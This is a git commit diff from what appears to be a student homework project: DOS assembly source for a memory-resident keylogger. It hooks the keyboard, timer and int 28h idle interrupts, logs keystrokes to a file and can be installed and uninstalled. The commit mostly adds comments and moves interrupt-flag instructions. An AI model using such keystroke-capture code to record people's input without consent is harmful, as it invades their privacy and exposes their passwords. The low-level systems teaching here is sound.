3d668ead80c6d51b308a5326246a7f8e87f56571
Dejan Pekter <deximat@gmail.com>
2012-11-06 12:22:27 +0100

    Doing some minor changes, needs testing

--- dosbox/homework/dos.asm
+++ dosbox/homework/dos.asm
@@ -1,3 +1,10 @@
+;================================
+;          DOS HANDLER
+; takes responsibility of writing
+;  to file if timer was unable
+;   to write due bios was busy
+;================================
+
 segment .code 
 
 install_dos_handler:
@@ -5,13 +12,10 @@ install_dos_handler:
   push ds
   push es
   cli
-  ;writing keyboard buffer to file when dos is idle
+  ;writing keyboard buffer to file when dos is idle and flag is set
   ;we will do this using int 28h
   
-  ;initialising ds - had a lot of problems with this, just to be sure
-  mov al, 'b'
-  call _printc
- 
+  ;initialising ds - had a lot of problems with this, just to be sure 
   mov ax, cs
   mov ds, ax
   ;zero
@@ -28,19 +32,21 @@ install_dos_handler:
   ;installing new
   mov [es:28h*4], word dos_handler
   mov [es:28h*4+2], cs
+  
+  sti
   pop es
   pop ds
-  popa
-  sti 
+  popa 
   ret
+
 uninstall_dos_handler:
   pusha
   push ds
   push es
   cli
 
+  ; set ds to tsr segment to be able to get old int info
   call set_ds_to_tsr
-
   ;zero
   xor ax, ax
   ;putting es to 0
@@ -52,18 +58,18 @@ uninstall_dos_handler:
   ;segment
   mov ax, [old_28h_segment]
   mov [es:28h*4+2], ax
+  
+  sti
   pop es
   pop ds
   popa
-  sti
   ret
 
 dos_handler:
   pusha
   push ds
   push es
-  mov al, 'A'
-  call _printc
+  
   ;initialising ds - had a lot of problems with this, just to be sure
   mov ax, cs
   mov ds, ax
@@ -72,6 +78,8 @@ dos_handler:
   jne .skip_write
   ;clear flag
   mov [int_28h_flag], byte 0h
+  cmp [buffer_size], 0h
+  je .skip_write
   ;check DOS to see if it is safe to use DOS int
   mov ah, 34h
   int 21h
@@ -89,6 +97,7 @@ dos_handler:
   ;calling old int
   pushf
   call far word [old_28h]
+  
   pop es
   pop ds
   popa
@@ -98,5 +107,4 @@ dos_handler:
 old_28h:
 old_28h_offset: dw 0
 old_28h_segment: dw 0
-second: db 0
 int_28h_flag: db 0
--- dosbox/homework/main.asm
+++ dosbox/homework/main.asm
@@ -7,30 +7,22 @@
 
 org 100h
 
-bufferSize equ 100    ; size of a buffer for keylogger
-
 segment .code
 
-; postavlja BX 
-
 _main:
-  
+  ;choosing uninstall or install option
   call uninstall_check
   je .uninstall
 .install:
-  ;mov al, 'I'
-  ;call _printc
   ;check to see if it is already installed
   call already_installed_check
   je .error_already_installed
 .success:
-  ;mov al, 'S'
-  ;call _printc
-  call set_file_name
-  call install_dos_handler
-  call install_flush_timer
-  call install_keyboard_handler
-  ;set segment of 60h on this
+  call set_file_name ; getting filename from command line and setting it for usage
+  call install_dos_handler ; install dos handler - waiting for flag to write to file
+  call install_flush_timer ; on every delay interval it tries to write to file if buffer non zero
+  call install_keyboard_handler ; keyboard handler takes every keystroke to buffer 
+  ;set segment of 60h on this - for checking if this is installed
   call override_60h
 
   ;display message of successful install
@@ -39,7 +31,6 @@ _main:
   mov di, installed_message
   call _print_asciiz_string
   jmp .end ; go to end, dont execute next block
-
 .error_already_installed:
   ;if keylogger already installed then 
   ;display message and terminate
@@ -55,13 +46,12 @@ _main:
 .success_un:
   ;mov al, 'S'
   ;call _printc
-  
+  ;uninstalling all installed ints
   call uninstall_keyboard_handler
   call uninstall_flush_timer
   call uninstall_dos_handler
-  ;set segment of 60h on this
-  call _close_file 
-  call restore_60h
+  call _close_file ; closing opened file
+  call restore_60h ; restoring old 60h segment
   
   ;removing tsr from memory
   mov ax, cs
@@ -69,7 +59,7 @@ _main:
   mov ah, 49h
   int 21h
 
-  ;display message of successful install
+  ;display message of successful uninstall
   mov ax, cs
   mov es, ax
   mov di, uninstalled_message
@@ -92,12 +82,14 @@ _main:
   mov al, 0h
   int 21h
 	
-;helper methods for main program
+;helper functions for main program
+
+;checks if program is called for uninstall
 uninstall_check:
   pusha
   push ds
   push es
-  
+  ; segment setup
   mov ax, cs
   mov ds, ax
   mov es, ax
@@ -105,36 +97,34 @@ uninstall_check:
   call _get_command_line;returns first character of ANSIIZ string of command line in si
   mov di, end_id        ;identificator for uninstall
   call _str_equals      ;checks to see if si and di are equal, sets flags 
+  
   pop es
   pop ds
   popa
   ret
+
 already_installed_check:
   pusha
   push ds
   push es
+  ;setting up segment
   mov ax, cs
   mov ds, ax
-  mov es, ax
+  ;setting offset of id variable
   mov di, program_id
-
+  mov si, program_id
+  ;setting to zero
   xor ax, ax
-  mov es, ax
-  mov si, program_id  
+  mov es, ax  
   ;get segment of potential installed program
   ;which is stored at [00h:60h*4+2] 
   ;if our program is installed
   mov ax, [es:60h*4+2]
   mov es, ax
-  
-  mov bx, ds
-  cmp bx, ax
-  je .end
   ;call _print_asciiz_string
   ;now lets see if there is same thing in offset 
   ;of program_id at segment written in 60h and here
   call _str_equals
-
 .end:
   pop es
   pop ds
@@ -145,25 +135,21 @@ set_file_name:
   pusha
   push ds
   push es
+  ; setup of segments
   mov ax, cs
   mov ds, ax
   mov es, ax
   call _get_command_line
   mov di, file_name
+  ; copy file name to file_name
 .loop:
   mov al, [si]
   mov [di], al
-  call _printc
   inc di
   inc si
-  test al, al
+  test al, al  ; aciiz
   jnz .loop
 
-  mov ax, cs
-  mov es, ax
-
-  mov di, file_name
-  call _print_asciiz_string
   pop es
   pop ds
   popa
@@ -177,6 +163,7 @@ override_60h:
   mov ds, ax
   ;blocking usage of interrupts
   cli
+  
   ;initializing es to be 0 (int table is in 0th segment)
   xor ax, ax
   mov es, ax
@@ -186,6 +173,7 @@ override_60h:
   ;installing this interrupt
   ;segment is same as this code segment - com only
   mov [es:60h*4+2], cs
+  
   ;unblocking usage of interrupts
   sti
   pop es
@@ -201,10 +189,11 @@ restore_60h:
   mov ds, ax
   ;blocking usage of interrupts
   cli
+
   ;initializing es to be 0 (int table is in 0th segment)
   xor ax, ax
   mov es, ax
-  ;saving old value of segment
+  ;restore value of segment
   mov ax, [old_60h_segment] 
   mov [es:60h*4+2], ax
   ;unblocking usage of interrupts
@@ -218,10 +207,10 @@ restore_60h:
 %include 'kbh.asm'
 %include 'timer.asm'
 %include 'dos.asm'
+
 segment .data
 
 end_id: db '-kraj', 0
-testVar: db "1233456"
 old_60h_segment: dw 0
 ;messages
 uninstalled_message: db "Keylogger succesfully uninstalled", 0
